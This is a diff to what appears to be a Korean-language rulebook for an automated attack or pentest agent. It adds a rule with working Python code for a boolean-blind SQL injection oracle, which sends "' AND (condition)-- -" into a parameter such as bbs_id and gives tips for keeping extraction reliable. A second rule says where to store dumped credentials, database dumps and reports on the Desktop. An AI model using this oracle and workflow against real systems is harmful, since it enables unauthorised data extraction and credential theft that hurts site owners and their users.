@@ -425,6 +425,60 @@ RULE #12: curl 요청에 세션 쿠키 + 브라우저 헤더 반드시 포함 (W
 
 RULE #13: bash에서 grep 사용 시 반드시 호환 옵션 사용 (macOS/Linux 공통)
 
+RULE #15: Oracle 재작성 시 — 최초 확인된 파라미터·메서드 반드시 그대로 유지 (CRITICAL)
+  Boolean Oracle이 한 번 확인된 후 재작성 할 때 파라미터명 또는 HTTP 메서드를 바꾸면
+  oracle이 항상 True 또는 항상 False를 반환하여 추출값이 'aaaa...' 같은 쓰레기가 됨.
+
+  ❌ 절대 금지 (재작성 시):
+    최초 확인: GET ?bbs_id=MAGAZINE  (크기 차이 2485B)
+    재작성:    POST data={"tid": payload}    ← 파라미터명/메서드 변경 → oracle 망가짐!
+
+  ✅ 반드시 이렇게:
+    최초 확인: GET ?bbs_id=MAGAZINE  → 재작성에도 GET ?bbs_id= 그대로 사용
+    최초 확인: POST data={"id": x}   → 재작성에도 POST data={"id": } 그대로 사용
+
+  oracle 재사용 패턴 (안전):
+    # 최초 캘리브레이션에서 확인된 값 그대로 복사
+    METHOD = "GET"           # 최초 확인 값 고정
+    PARAM  = "bbs_id"        # 최초 확인 값 고정
+    BASE   = "MAGAZINE"      # 최초 정상값 고정
+
+    def oracle(condition):
+        if METHOD == "GET":
+            r = s.get(f"{TARGET}?{PARAM}={BASE}' AND ({condition})-- -", ...)
+        else:
+            r = s.post(TARGET, data={PARAM: f"{BASE}' AND ({condition})-- -"}, ...)
+        return len(r.text) > TRUE_THRESHOLD  # 캘리브레이션 임계값 고정
+
+  ★ oracle 재작성 전 반드시 확인:
+    1. 파라미터명 동일한가? (bbs_id → bbs_id ✓)
+    2. HTTP 메서드 동일한가? (GET → GET ✓)
+    3. 기저값(BASE) 동일한가? (MAGAZINE → MAGAZINE ✓)
+    4. 임계값(크기 기준) 동일한가? (>500 → >500 ✓)
+    이 4가지 중 하나라도 바뀌면 즉시 재캘리브레이션 필수.
+
+RULE #16: 파일 저장 경로 — 중간 임시 파일은 /tmp/, 최종 결과는 Desktop/dump/ (MANDATORY)
+  ❌ 절대 금지:
+    /home/ubuntu/pen200/tmp/     ← 존재하지 않는 경로 (권한 오류 발생)
+    /root/tmp/                   ← 대부분 환경에서 없음
+    /opt/*/tmp/                  ← 임의 경로
+
+  ✅ 올바른 경로:
+    임시 파일:  /tmp/resp.txt  /tmp/cookies.txt  /tmp/bingo_state.json  (항상 /tmp/ 사용)
+    최종 결과:  ~/Desktop/dump/타겟명_YYYYMMDD/   (크리덴셜·덤프·리포트)
+
+  Python에서 Desktop dump 경로 생성:
+    import pathlib, platform, time
+    home = pathlib.Path.home()
+    if platform.system() == "Windows":
+        desk = home / "OneDrive" / "Desktop"
+        if not desk.exists(): desk = home / "Desktop"
+    else:
+        desk = home / "Desktop"
+        if not desk.exists(): desk = home
+    SAVE_DIR = desk / "dump" / "target_name"
+    SAVE_DIR.mkdir(parents=True, exist_ok=True)
+
 RULE #14: Python에서 HTTP 상태 코드 비교 — int에 'in' 금지
   ❌ 절대 금지: "text" in r.status_code  → TypeError: argument of type 'int' is not iterable
   ❌ 절대 금지: "200" in r.status_code   → 같은 에러
